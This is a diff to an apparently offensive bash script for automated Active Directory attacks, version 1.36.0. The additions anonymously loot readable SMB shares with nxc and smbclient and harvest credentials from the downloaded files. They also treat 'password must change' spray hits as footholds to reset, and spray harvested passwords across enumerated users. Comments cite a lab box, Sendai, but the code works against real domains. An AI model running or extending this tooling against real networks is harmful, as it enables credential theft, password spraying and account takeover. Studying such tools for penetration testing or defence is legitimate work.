@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.35.7"
+readonly VERSION="1.36.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -689,6 +689,43 @@ phase_unauth() {
         echo "$sh" >"$OUTDIR/shares_anon.txt"
     fi
     have smbmap && { run "smbmap -H $DC_IP -u null -p null"; smbmap -H "$DC_IP" -u null -p null 2>&1 | tee -a "$LOGFILE"; }
+
+    # DOWNLOAD + harvest anonymously-readable shares. Listing isn't enough — the
+    # weak-password hint that gives the foothold lives INSIDE these files (e.g.
+    # Sendai's incident.txt). nxc's null spider is tried first; if it pulls nothing
+    # (or nxc --shares misses a share that smbclient/smbmap can see) we fall back to
+    # smbclient recursive download per readable non-default share.
+    subsection "Anonymous share looting — download readable files + harvest creds"
+    local adl="$OUTDIR/shares_anon"; mkdir -p "$adl"
+    $NXC smb "$DC_IP" -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
+        EXCLUDE_EXTS=ico,lnk,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,exe,dll,msi,sys EXCLUDE_FILTER=ipc\$ \
+        OUTPUT_FOLDER="$adl" 2>&1 | tail -15 | tee -a "$LOGFILE"
+    if [[ -z "$(find "$adl" -type f ! -name '*.json' 2>/dev/null)" ]] && have smbclient; then
+        info "nxc null-spider pulled nothing → falling back to smbclient recursive download"
+        local _shl; _shl=$(printf '%s\n' "$sh" | grep -iE '[[:space:]]READ([[:space:]]|$)' \
+            | sed -E 's/^[A-Z]+[[:space:]]+\S+[[:space:]]+[0-9]+[[:space:]]+\S+[[:space:]]+//' | awk '{print $1}')
+        [[ -z "$_shl" ]] && _shl=$(smbclient -L "//$DC_IP" -N 2>/dev/null | awk '/Disk/{print $1}')
+        local _s
+        while IFS= read -r _s; do
+            [[ -z "$_s" ]] && continue
+            case "${_s^^}" in ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON|SHARE|-----|DISK) continue;; esac
+            local _d="$adl/$_s"; mkdir -p "$_d"
+            smbclient "//$DC_IP/$_s" -N -c "recurse ON; prompt OFF; lcd \"$_d\"; mget *" >/dev/null 2>&1
+        done < <(printf '%s\n' "$_shl" | sort -u)
+    fi
+    local _af; _af=$(find "$adl" -type f ! -name '*.json' 2>/dev/null)
+    if [[ -n "$_af" ]]; then
+        loot "$(echo "$_af" | grep -c .) file(s) pulled from anonymous shares → shares_anon/"
+        # Show small text files inline (the hint is usually a .txt note).
+        while IFS= read -r _f; do
+            [[ -z "$_f" ]] && continue
+            detail "      ${C_BOLD}### ${_f#$adl/}${C_RESET}"
+            sed 's/^/        /' "$_f" 2>/dev/null | head -25 | while IFS= read -r _l; do detail "$_l"; done
+        done < <(find "$adl" -type f -size -20k \( -iname '*.txt' -o -iname '*.md' -o -iname '*.csv' -o -iname '*.ini' -o -iname '*.conf' -o -iname '*.cnf' -o -iname '*.xml' -o -iname '*.html' -o -iname '*.config' \) 2>/dev/null | head -12)
+        harvest_secrets "anon-shares" < <(find "$adl" -type f -size -200k ! -name '*.json' -exec cat {} + 2>/dev/null)
+    else
+        info "No files in anonymously-readable shares"
+    fi
 
     subsection "RID brute force (enumerate users without credentials)"
     run "$NXC smb $DC_IP -u '' -p '' --rid-brute 4000"
@@ -4166,12 +4203,22 @@ _spray_one() {
         while IFS= read -r line; do
             u=$(echo "$line" | grep -oP '\\\K[^\\:]+(?=:)' | head -1)
             [[ -z "$u" ]] && continue
+            # STATUS_PASSWORD_MUST_CHANGE = the password is CORRECT but the account
+            # must change it at next logon (the classic anonymous-foothold trick on
+            # boxes like Sendai). Queue it with this password — the assessment's
+            # getTGT will hit KEY_EXPIRED and _change_expired_password resets it.
+            if grep -qi 'STATUS_PASSWORD_MUST_CHANGE' <<<"$line"; then
+                loot "★ Valid (MUST-CHANGE) credential → ${C_GREEN}${u} : ${pw}${C_RESET} — will reset on pivot"
+                note_cred_source "${u}:${pw}" "spray (must-change → reset)"
+                queue_cred "$u" "$pw" "" "spray (must-change)"
+                continue
+            fi
             loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
             note_cred_source "${u}:${pw}" "password spray (nxc)"
             echo "$line" | grep -qi 'Pwn3d' && loot "  ↳ ${u} is LOCAL ADMIN where sprayed"
             queue_cred "$u" "$pw" "" "password spray"
         done < <($NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
-                   | tee -a "$LOGFILE" | grep -iE '\[\+\]')
+                   | tee -a "$LOGFILE" | grep -iE '\[\+\]|STATUS_PASSWORD_MUST_CHANGE')
     fi
 }
 
@@ -5985,6 +6032,13 @@ main() {
             if [[ "$cs" =~ ^[a-fA-F0-9]{32}$ ]]; then queue_cred "$cu" "" "$cs"
             else queue_cred "$cu" "$cs" ""; [[ -n "$cs" ]] && add_secret "$cs"; fi
         done <"$CREDS_FILE"
+    fi
+    # Anonymous start with no foothold yet but passwords harvested (e.g. from
+    # anonymous shares): spray them across the enumerated users to seed the first
+    # identity (incl. must-change accounts → reset) before draining the queue.
+    if [[ ${#CRED_QUEUE[@]} -eq 0 && ${#FOUND_SECRETS[@]} -gt 0 && -s "$OUTDIR/users_all.txt" ]]; then
+        section "SEEDING · spray harvested passwords × enumerated users (no foothold yet)"
+        phase_password_spray
     fi
     process_queue
 
